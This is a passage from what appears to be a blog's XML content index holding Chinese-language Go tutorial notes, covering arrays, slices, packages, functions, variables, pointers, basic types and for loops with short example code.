class="string">&quot;上海&quot;</span>, <span class="string">&quot;深圳&quot;</span>&#125; <span class="comment">//使用指定的初始值完成初始化</span></span><br></pre></td></tr></table></figure><h4 id="编译器判断长度">编译器判断长度</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> numArray = [...]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>&#125;</span><br><span class="line"><span class="keyword">var</span> cityArray = [...]<span class="type">string</span>&#123;<span class="string">&quot;北京&quot;</span>, <span class="string">&quot;上海&quot;</span>, <span class="string">&quot;深圳&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="指定索引值">指定索引值</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r := [...]<span class="type">int</span>&#123;<span class="number">99</span>: <span class="number">-1</span>&#125;</span><br></pre></td></tr></table></figure><p>定义了一个含有 100 个元素的数组 <code>r</code>，最后一个元素被初始化为 -1，其它元素都是用 0 初始化</p><h3 id="数组遍历">数组遍历</h3><p>与大多数语言一样，Go语言遍历的方式主要分为两种方法：for和for range</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法1：for循环遍历</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(a); i++ &#123;</span><br><span class="line">fmt.Println(a[i])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法2：for range遍历</span></span><br><span class="line"><span class="keyword">for</span> index, value := <span class="keyword">range</span> a &#123;</span><br><span class="line">fmt.Println(index, value)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数组是值类型">数组是值类型</h3><p>Go语言的数组是值类型，并不是引用类型。这导致Go语言与C、Java不同的是，Go的数组<strong>赋值和传参会复制整个数组</strong>。因此传参或是赋值，得到的新数组是原数组的一个副本，修改新数组并不会导致原数组发生变化。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">changeArray</span><span class="params">(x [3]<span class="type">int</span>)</span></span> &#123;</span><br><span class="line">x[<span class="number">0</span>] = <span class="number">100</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">a := [<span class="number">3</span>]<span class="type">int</span>&#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>&#125;</span><br><span class="line">changeArray(a) <span class="comment">//在changeArray中修改的是a的副本x</span></span><br><span class="line">fmt.Println(a) <span class="comment">//[10 20 30]，原数组无变化</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="注意点">注意点</h3><ol><li><code>[n]*T</code>表示指针数组，<code>*[n]T</code>表示数组指针</li><li>在Go语言中，数组的长度也是类型的一部分，也就意味着在函数的形参处，数组长度必须要确定，这导致了<strong>输入数组的长度必须是相同的</strong>，使得数组有很多局限性</li></ol><h2 id="切片">切片</h2><p>前面我们提到，数组在函数形参初输入数组长度必须是相同，这导致数组有很多局限性</p><p>Go语言提供了一种非常灵活的，拥有相同类型元素的可变长度的序列——切片（Slice）。切片的概念类似于“动态数组”，它是基于数组类型做的一层封装，支持自动扩容。</p><p>切片是一个引用类型，因此从数组中得到的切片修改元素值时，原数组也会发生变化，修改原数组时，切片也会变化。切片一般用于快速地操作一块数据集合。</p><p>它的内部结构包括<code>地址</code>、<code>长度</code>、<code>容量</code>。</p><h3 id="切片的定义">切片的定义</h3><p><strong>长度与容量</strong></p><p>正如上文所言，切片拥有长度和容量，这与其他语言中的数组类似。</p><p>我们可以通过内置的len()函数求得长度，通过内置的cap()函数求得容量。</p><h4 id="声明的基本语法">声明的基本语法</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> 变量名 []类型</span><br></pre></td></tr></table></figure><h4 id="切片表达式构造切片">切片表达式构造切片</h4><p>切片表达式可以从字符串、数组、指向数组或切片的指针构造子字符串或切片。</p><p>它具有两种形式：</p><ol><li>指定low和high两个索引界限值的简单形式——<code>low:high</code></li><li>除了low和high索引界限值外还指定容量的完整形式——<code>low:high:max</code></li></ol><p><strong>简单形式</strong></p><p>我们通过表达式中的low和high就可以确定数组中的索引范围，为一个左包含，右不包含。得到的切片长度为<code>high-low</code>，容量等于切片的底层数组的容量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a := [<span class="number">5</span>]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">s := a[<span class="number">1</span>:<span class="number">3</span>]</span><br><span class="line">fmt.Printf(<span class="string">&quot;s:%v len(s):%v cap(s):%v\n&quot;</span>, s, <span class="built_in">len</span>(s), <span class="built_in">cap</span>(s))</span><br><span class="line"><span class="comment">//s:[2 3] len(s):2 cap(s):4</span></span><br></pre></td></tr></table></figure><p>在切片表达式中，我们可以省略任何索引：</p><ul><li>省略low为从0开始</li><li>省略high为到切片操作数的长度</li></ul><p><strong>注意</strong>：对于切片再切片，high上线边界为原切片的容量cap(a)，而不是长度。</p><p><strong>完整形式</strong></p><p>对于数组，指向数组的指针，或切片（不支持字符串）支持完整切片表达式</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[low:high:max]</span><br></pre></td></tr></table></figure><p>该表达式会构建一个与<code>a[low:high]</code>同类型、同长度、同元素，但是容量会被设置为<code>max-low</code>的切片。</p><p>在完整切片表达式中，只有第一个索引值<code>low</code>可以省略。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a := [<span class="number">5</span>]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">t := a[<span class="number">1</span>:<span class="number">3</span>:<span class="number">5</span>]</span><br><span class="line">fmt.Printf(<span class="string">&quot;t:%v len(t):%v cap(t):%v\n&quot;</span>, t, <span class="built_in">len</span>(t), <span class="built_in">cap</span>(t))</span><br><span class="line"><span class="comment">//t:[2 3] len(t):2 cap(t):4</span></span><br></pre></td></tr></table></figure><h4 id="make-函数构造切片">make()函数构造切片</h4><p>切片表达式都是基于现有数组来创建的切片，如果我们需要动态的创建一个切片，则我们需要用到内置的<code>make()</code>函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">make</span>([]T, size, <span class="built_in">cap</span>)</span><br></pre></td></tr></table></figure><p>其中，T为切片的元素类型，size为元素长度，cap为容量</p><p>可以只指定长度，也开也长度容量都指定</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s1 := <span class="built_in">make</span>([]<span class="type">uint32</span>)</span><br><span class="line">s2 := <span class="built_in">make</span>([]<span class="type">uint32</span>, <span class="number">1</span>)</span><br><span class="line">s3 := <span class="built_in">make</span>([]<span class="type">uint32</span>, <span class="number">1</span>, <span class="number">10</span>)</span><br></pre></td></tr></table></figure><h4 id="切片的性质">切片的性质</h4><p><strong>判断切片是否为空</strong></p><p>要检查切片是否为空，请使用<code>len(s) == 0</code>来判断，而不应该使用<code>s == nil</code>来判断。</p><p>没有底层数组的切片值为<code>nil</code>，一个nil切片长度和容量都为0，但是长度和容量都为0的切片不一定是nil：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s1 []<span class="type">int</span>         <span class="comment">//len(s1)=0;cap(s1)=0;s1==nil</span></span><br><span class="line">s2 := []<span class="type">int</span>&#123;&#125;        <span class="comment">//len(s2)=0;cap(s2)=0;s2!=nil</span></span><br><span class="line">s3 := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">0</span>) <span class="comment">//len(s3)=0;cap(s3)=0;s3!=nil</span></span><br></pre></td></tr></table></figure><p>因此，要判断一个切片是否为空，要使用<code>len(s) == 0</code>来判断，而不应该使用<code>s == nil</code>来判断</p><p><strong>切片不能直接相互比较</strong></p><p>切片之间是不能直接相互比较的，我们不能使用<code>==</code>判断两个切片是否含有相同的元素。</p><p>切片唯一合法的比较操作是和<code>nil</code>比较。若要比较，则只能通过枚举比较的方式进行比较。</p><p>对于<code>[]byte</code>，可以使用标准库提供的<code>bytes.Equal</code>函数比较。</p><h3 id="切片的本质">切片的本质</h3><p>切片的本质是对底层数组的封装。它包含了三个信息：底层数组的指针、切片的长度（len）和切片的容量（cap）。</p><p>例子：数组<code>a := [8]int&#123;0, 1, 2, 3, 4, 5, 6, 7&#125;</code>，切片<code>s1 := a[:5]</code>，相应示意图如下：</p><p><img src="https://image.icewindy.cn/202301281540207.png" alt="slice_01"></p><p>切片<code>s2 := a[3:6]</code>，相应示意图如下：</p><p><img src="https://image.icewindy.cn/202301281544254.png" alt="slice_02"></p><h3 id="crud">CRUD</h3><h4 id="添加元素">添加元素</h4><p>通过<code>append()</code>函数可以向切片的底层数组中追加元素，可以添加0个或多个元素，并且切片的底层数组会自动扩容。</p><p>每个切片会指向一个底层数组，这个数组的容量够用就添加新增元素。当底层数组不能容纳新增的元素时，切片就会自动按照一定的策略进行“扩容”，此时该切片指向的底层数组就会更换。“扩容”操作往往发生在<code>append()</code>函数调用时，所以我们通常都需要<strong>用原变量接收append函数的返回值</strong>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s := <span class="built_in">make</span>([]<span class="type">uint32</span>, <span class="number">0</span>, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">append</span>(s, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">fmt.Println(<span class="built_in">len</span>(s), <span class="built_in">cap</span>(s)) <span class="comment">// 3 4</span></span><br><span class="line"></span><br><span class="line">s = <span class="built_in">append</span>(s, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>)</span><br><span class="line">fmt.Println(<span class="built_in">len</span>(s), <span class="built_in">cap</span>(s)) <span class="comment">// 6 8</span></span><br></pre></td></tr></table></figure><p>如果需要追加其他切片或数组，可以在需添加的切片后面<code>...</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="built_in">append</span>(s, s1...)</span><br></pre></td></tr></table></figure><h4 id="切片遍历">切片遍历</h4><p>切片遍历与数组遍历是相同的，支持：</p><ul><li>索引遍历<code>for</code></li><li><code>for index, value := range s</code></li></ul><h4 id="修改元素">修改元素</h4><p>通过下标指定即可修改。</p><p>注意：在使用for range时，不能通过直接修改遍历所使用的变量，因为range赋值得到的变量是一份副本，并不是引用。例如：<code>for k,v:= range s</code>，只能通过修改s[k]，而不能直接修改v。</p><h4 id="删除元素">删除元素</h4><p>截取需要留下部分的，在赋值给原切片即可。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line">s = <span class="built_in">append</span>(s[:<span class="number">2</span>], s[<span class="number">3</span>:]...)</span><br></pre></td></tr></table></figure><h4 id="切片拷贝">切片拷贝</h4><p><strong>引用拷贝</strong></p><p>直接使用<code>=</code>操作符赋值的拷贝，新切片得到的是引用拷贝，原切片与新切片所指向的底层数组为同一个数组</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s1 := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">3</span>) <span class="comment">//[0 0 0]</span></span><br><span class="line">s2 := s1             <span class="comment">//将s1直接赋值给s2，s1和s2共用一个底层数组</span></span><br><span class="line">s2[<span class="number">0</span>] = <span class="number">100</span></span><br><span class="line">fmt.Println(s1)  <span class="comment">//[100 0 0]</span></span><br><span class="line">fmt.Println(s2)   <span class="comment">//[100 0 0]</span></span><br></pre></td></tr></table></figure><p><strong>值拷贝</strong></p><p>如果我们需要拷贝一个值相同的切片，则我们需要用到<code>copy()</code>函数，该函数可以将原数组切片复制到新的数组切片。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span>(newSlice, oldSlice)</span><br></pre></td></tr></table></figure><p>如果两个数组切片不一样大，则会按照较小的一个数组切片的元素个数进行赋值。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s1 := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125; </span><br><span class="line">s2 := []<span class="type">int</span>&#123;<span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>&#125; </span><br><span class="line"></span><br><span class="line"><span class="built_in">copy</span>(s2, s1) <span class="comment">// 只会复制s1的前3个元素到s2中 </span></span><br><span class="line"><span class="built_in">copy</span>(s1, s2) <span class="comment">// 只会复制s2的3个元素到s1的前3个位置</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang基础笔记（2）：程序结构</title>
      <link href="/2023/01/18/golang%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%EF%BC%882%EF%BC%89%EF%BC%9A%E7%A8%8B%E5%BA%8F%E7%BB%93%E6%9E%84/"/>
      <url>/2023/01/18/golang%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%EF%BC%882%EF%BC%89%EF%BC%9A%E7%A8%8B%E5%BA%8F%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h2 id="hello-world">Hello World!</h2><p>从每个语言学习的开始讲起：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;hello golang&quot;</span>)</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="包">包</h2><p>每个Go程序都是由包构成，每个项目都是从<code>main</code>包作为入口的。</p><h3 id="导入包">导入包</h3><p>使用<code>import</code>语句导入包，在<code>Hello World</code>程序中，我们导入了<code>fmt</code>包</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br></pre></td></tr></table></figure><p>常常的，我们在写程序时都会遇到需要导入多个包的情况，在Golang中，我们有两种形式导入多个包：</p><p>第一种是多个import</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;math&quot;</span></span><br></pre></td></tr></table></figure><p>我们还可以选择将多个包用括号括起来在一个import中</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;math&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>值得注意的一点：<strong><code>import</code>语句只对当前文件有效</strong></p><h3 id="导出名">导出名</h3><p>在Java中，我们用<code>public</code>和<code>private</code>关键词来标记一个方法是包外是否可用的。</p><p>而在Go中，使用了首字母大小写来表示这个，大写字母则代表public的。例如在我们的第一个程序中的Println就是一个以大写字母开头的。</p><h3 id="例子">例子</h3><p>新建一个hello在目录下，并在下面新建一个Sayhello.go文件</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hello</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SayHello</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Hello golang&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">noHello</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;No Hello&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们将mian.go修改为</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;golang_basic/hello&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">hello.SayHello()</span><br><span class="line">    hello.noHello()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们对其运行会发现报错了，因为noHello并不是一个可以在包外调用的函数。</p><h2 id="函数">函数</h2><p>如果你在使用一些智能的IDE，在输入func进行补全的时候，你会发现func的模板与我们学过的语言都不同的地方，它在参数列表后面，会有一个可以填入的地方</p><p><img src="https://image.icewindy.cn/202301181804873.png" alt="image-20230118180440834"></p><p>这是因为go的函数声明与其它的语言稍微有些不同</p><h3 id="声明模板">声明模板</h3><p>基本函数声明模板如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> 函数名 <span class="params">(参数列表)</span></span> (返回值列表)&#123;</span><br><span class="line"><span class="comment">// 函数体</span></span><br><span class="line"><span class="keyword">return</span> 返回值列表</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它相较其它大多数语言，Go多了一个返回值列表</p><p>Go在函数声明上还有一个不同的点就是Go的参数是名称在前，类型在后</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(x <span class="type">int</span>, y <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line"><span class="keyword">return</span> x + y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于上面的例子，参数的类型是相同的，所以我们可以将其类型写在一起</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(x, y <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line"><span class="keyword">return</span> x + y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="多值返回">多值返回</h3><p>Go语言支持多个返回值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">swap</span><span class="params">(x, y <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">string</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> y, x</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="命名返回值">命名返回值</h3><p>在返回值列表中，我们可以将返回值命名。我们在给返回值赋值后，可以在最后使用一个return就可以返回所有定义的返回值。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(x, y <span class="type">int</span>)</span></span> (ans <span class="type">int</span>) &#123;</span><br><span class="line">ans = x + y</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="变量">变量</h2><h3 id="声明-初始化">声明、初始化</h3><p>在前面我们提到go的函数内参数是名称在前，类型在后的，变量的声明也不例外</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> 变量名 类型 = 表达式</span><br></pre></td></tr></table></figure><p>类型与表达式可以省略一个;</p><ul><li>类型省略则会根据表达式自动推断类型</li><li>表达式省略则会自动初始化该变量为该类型的零值</li></ul><p>前面我们提到Go语言支持多值返回，因此一组变量也可以通过接受函数返回值进行初始化</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a, b = swap(a, b)</span><br></pre></td></tr></table></figure><p>在接受的时候，我们可以通过下划线抛弃我们不需要的值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a, _ = swap(a, b)</span><br></pre></td></tr></table></figure><p>声明也可以像import一样，用括号括起来</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line">a = <span class="number">1</span></span><br><span class="line">    b = <span class="number">2</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="短声明">短声明</h3><p>短声明<code>:=</code>相当于是一个省略类型的声明语句，可以替代var使用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">变量名 := 表达式</span><br></pre></td></tr></table></figure><p>例子</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a, b := swap(a, b)</span><br></pre></td></tr></table></figure><p>符号</p><h3 id="赋值">赋值</h3><p>Go语言的赋值与大多数语言（C，Java…)的赋值都类似</p><p>相较于C、Java一类，Go语言加入了一个比较“摩登”的赋值，元祖赋值，一个例子就是上马的接受函数的多变量初始化</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a, b = b, a</span><br></pre></td></tr></table></figure><p>这使得交换两个变量的值不再需要一个中间存储值，这极大便利了变量的交换，减少了不少逻辑上思考的步骤</p><h3 id="指针">指针</h3><p>Go语言的指针与C语言中的指针使用的方法大致相同，也都是通过<code>*</code>、<code>&amp;</code>来对地址进行操作</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> 变量名 *类型</span><br></pre></td></tr></table></figure><p>举个例子</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a *<span class="type">int</span>        <span class="comment">//指向整型</span></span><br><span class="line"><span class="keyword">var</span> b *<span class="type">float32</span>    <span class="comment">//指向浮点型</span></span><br><span class="line"></span><br><span class="line">c := <span class="number">1</span></span><br><span class="line">d := &amp;c           <span class="comment">//我们也可以通过短声明来创建</span></span><br></pre></td></tr></table></figure><h4 id="空指针">空指针</h4><p>当一个指针定义后没有分配给任何变量时，他的值为<code>nil</code></p><p>nil 指针也称为空指针</p><p>nil在概念上和其它语言的null、None、nil、NULL一样，都指代零值或空值。</p><h2 id="数据类型">数据类型</h2><h3 id="基本数据类型">基本数据类型</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span></span><br><span class="line"></span><br><span class="line"><span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span>  <span class="type">int8</span>  <span class="type">int16</span>  <span class="type">int32</span>  <span class="type">int64</span> <span class="comment">//有符号整型</span></span><br><span class="line"><span class="type">uint</span> <span class="type">uint8</span> <span class="type">uint16</span> <span class="type">uint32</span> <span class="type">uint64</span> <span class="type">uintptr</span> <span class="comment">//无符号整型</span></span><br><span class="line"></span><br><span class="line"><span class="type">byte</span> <span class="comment">//类似uint8</span></span><br><span class="line"></span><br><span class="line"><span class="type">rune</span> <span class="comment">//类似int32</span></span><br><span class="line"></span><br><span class="line"><span class="type">float32</span> <span class="type">float64</span> <span class="comment">//单精度浮点 双精度浮点</span></span><br><span class="line"></span><br><span class="line"><span class="type">complex64</span> <span class="type">complex128</span> <span class="comment">//实数和虚数</span></span><br></pre></td></tr></table></figure><h3 id="类型转换">类型转换</h3><p>Go语言<code>不提供类型自动转换</code>，只可以通过<code>T(v)</code>的方式将值v转换为类型T</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i <span class="type">int</span> = <span class="number">42</span></span><br><span class="line"><span class="keyword">var</span> f <span class="type">float64</span> = <span class="type">float64</span>(i)</span><br><span class="line"><span class="keyword">var</span> u <span class="type">uint</span> = <span class="type">uint</span>(f)</span><br></pre></td></tr></table></figure><h3 id="类型别名">类型别名</h3><p>类似于define，在编译的时候会全部替换掉</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> DataTYPE = <span class="type">string</span></span><br></pre></td></tr></table></figure><h3 id="自定义类型">自定义类型</h3><p>可以基于已有类型定义初新的类型，互相可以强制转换，可以添加类型自己的方法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> newtype <span class="type">string</span></span><br></pre></td></tr></table></figure><h2 id="逻辑控制">逻辑控制</h2><h3 id="for">for</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">sum += i</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相当于是省略了小括号</p><p>注意：大括号为必须存在的</p><p>在Go语言中，是<code>没有while</code>的，while可以用省略起始条件和后置语句的for替代</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sum := <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> sum &lt; <span class="number">1000</span> &#123;</span><br><span class="line">sum += sum</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而无限循环则为</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 